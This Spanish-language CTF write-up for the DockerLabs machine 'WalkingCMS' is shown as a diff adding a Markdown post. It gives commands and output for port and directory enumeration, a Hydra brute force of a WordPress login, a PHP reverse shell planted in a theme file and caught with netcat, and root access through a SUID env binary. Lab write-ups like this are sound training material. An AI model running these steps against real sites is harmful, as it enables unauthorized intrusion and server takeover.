@@ -1,0 +1,159 @@
+---
+type: writeup
+title: WalkingCMS
+description: Intrusión por fuerza bruta en el panel interno de wordpress y acceso al servidor desde dicho panel.
+lang: es
+draft: false
+featured: true
+image: ../../../images/writeups/dockerlabs/dockerlabs.webp
+platform: dockerlabs
+url: https://dockerlabs.es/
+difficulty: facil
+hints: []
+tags: []
+---
+
+## Enumeration
+
+Enumeramos todos los puertos para ver cuáles están abiertos y qué servicios corren en ellos.
+
+```bash
+sudo nmap -p- -sS --min-rate 5000 -Pn -n -vv -oA nmap/allports 172.17.0.2
+```
+
+```plaintext
+PORT   STATE SERVICE REASON
+80/tcp open  http    syn-ack ttl 64
+```
+
+```bash
+nmap -p 80 -sCV -oA nmap/openports 172.17.0.2
+```
+
+```plaintext
+PORT   STATE SERVICE VERSION
+80/tcp open  http    PHP cli server 5.5 or later
+|_http-server-header: ERROR: Script execution failed (use -d to debug)
+|_http-title: Apache2 Debian Default Page: It works
+|_hnap-info: ERROR: Script execution failed (use -d to debug)
+|_http-trane-info: ERROR: Script execution failed (use -d to debug)
+|_https-redirect: ERROR: Script execution failed (use -d to debug)
+|_vmware-version: ERROR: Script execution failed (use -d to debug)
+|_rpcinfo: ERROR: Script execution failed (use -d to debug)
+```
+
+| PUERTO | SERVICIO |
+| ------ | -------- |
+| 80     | HTTP     |
+
+Enumeramos posibles directorios.
+
+```bash
+ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -u http://172.17.0.2/FUZZ -ic -c -fs 10701
+```
+
+```plaintext
+wordpress               [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 42ms]
+```
+
+```bash
+wpscan --url 172.17.0.2/wordpress --api-token $WPSCAN_API_TOKEN -e vp,vt
+```
+
+```plaintext
+<SNIP>
+[+] WordPress theme in use: twentytwentytwo
+ | Location: http://172.17.0.2/wordpress/wp-content/themes/twentytwentytwo/
+ | Last Updated: 2026-08-19 3:00am GMT (2 months ago, per WordPress.org)
+ | Active Installs: 100,000 (per WordPress.org)
+ | Readme: http://172.17.0.2/wordpress/wp-content/themes/twentytwentytwo/readme.txt
+ | [!] The version is out of date, the latest version is 2.1
+ | Style URL: http://172.17.0.2/wordpress/wp-content/themes/twentytwentytwo/style.css?ver=1.6
+ | Style Name: Twenty Twenty-Two
+ | Style URI: https://wordpress.org/themes/twentytwentytwo/
+ | Description: Built on a solidly designed foundation, Twenty Twenty-Two embraces the idea that everyone deserves a...
+ | Author: the WordPress team
+ | Author URI: https://wordpress.org/
+ |
+ | Found By: Css Style In Homepage (Passive Detection)
+ | Confirmed By: Css Style In 404 Page (Passive Detection)
+ |
+ | Version: 1.6 (80% confidence)
+ | Found By: Style (Passive Detection)
+ |  - http://172.17.0.2/wordpress/wp-content/themes/twentytwentytwo/style.css?ver=1.6, Match: 'Version: 1.6'
+ <SNIP>
+```
+
+Visitamos el sitio `http://172.17.0.2/wordpress/`.
+
+![Wordpress site](@images/writeups/dockerlabs/walkingcms/walkingcms-wordpress.png)
+
+Visitamos el primer post y encontramos un usuario `mario`.
+
+![First post](@images/writeups/dockerlabs/walkingcms/walkingcms-firstpost.png)
+
+Podemos hacer fuerza bruta con ese usuario en el login.
+
+```bash
+hydra -l mario -P /usr/share/wordlists/seclists/Passwords/Leaked-Databases/rockyou.txt 172.17.0.2 http-post-form "/wordpress/wp-login.php:log=^USER^&pwd=^PASS^:Error" -I -t 16 -f
+```
+
+```plaintext
+[80][http-post-form] host: 172.17.0.2   login: mario   password: love
+```
+
+Dado que tenemos un theme que podemos editar estando en el panel de administración, procedemos a editar el theme twentytwentytwo agegando una [reverse shell](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php) dentro del archivo `index.php`. Una vez agregado el contenido de la reverse shell dentro del archivo `index.php` presionamos `Update File` para guardar los cambios, nos ponemos en escucha en la máquina atacante y forzamos la ejecución del archivo ingresando a `http://172.17.0.2/wordpress/wp-content/themes/twentytwentytwo/`.
+
+![Reverse shell](@images/writeups/dockerlabs/walkingcms/walkingcms-reverseshell.png)
+
+```bash
+nc -lnvp 1111
+```
+
+```plaintext
+Connection received on 172.17.0.2 53488
+Linux 693a6f36ee1d 7.2.11-arch1-1 #1 SMP PREEMPT_DYNAMIC Fri, 16 Oct 2026 00:28:58 +0000 x86_64 GNU/Linux
+ 15:53:27 up  2:13,  0 user,  load average: 1.69, 1.24, 0.94
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+/bin/sh: 0: can't access tty; job control turned off
+$
+```
+
+Verificamos como qué usuario estamos con el comando `id`.
+
+```plaintext
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+```
+
+## Privilege Escalation
+
+Buscamos archivos que pertenecen al usuario `root` y tienen activado el permiso SUID, lo que permite a cualquier usuario ejecutarlo con los privilegios del propietario del archivo, en este caso `root`.
+
+```bash
+find / -type f -perm -4000 -user root 2>/dev/null -ls
+```
+
+```plaintext
+  7512273     64 -rwsr-xr-x   1 root     root        62672 Mar 23  2023 /usr/bin/chfn
+  7512398     60 -rwsr-xr-x   1 root     root        59704 Mar 23  2023 /usr/bin/mount
+  7512466     72 -rwsr-xr-x   1 root     root        72000 Mar 23  2023 /usr/bin/su
+  7512279     52 -rwsr-xr-x   1 root     root        52880 Mar 23  2023 /usr/bin/chsh
+  7512414     68 -rwsr-xr-x   1 root     root        68248 Mar 23  2023 /usr/bin/passwd
+  7875501     48 -rwsr-xr-x   1 root     root        48536 Sep 20  2022 /usr/bin/env
+  7512490     36 -rwsr-xr-x   1 root     root        35128 Mar 23  2023 /usr/bin/umount
+  7512340     88 -rwsr-xr-x   1 root     root        88496 Mar 23  2023 /usr/bin/gpasswd
+  7512403     48 -rwsr-xr-x   1 root     root        48896 Mar 23  2023 /usr/bin/newgrp
+```
+
+El binario que parece más sospechoso es `env`. Buscamos en la web [GTFOBins](https://gtfobins.org/gtfobins/env/#shell) y encontramos que podemos aprovechar el binario si tiene el permiso SUID. Lo ejecutamos como se indica para otorgarnos una shell con privilegios de `root`.
+
+```bash
+env /bin/sh -p
+```
+
+Verificamos con el comando `id` que tenemos privilegios de `root`.
+
+```bash
+uid=33(www-data) gid=33(www-data) euid=0(root) groups=33(www-data)
+```
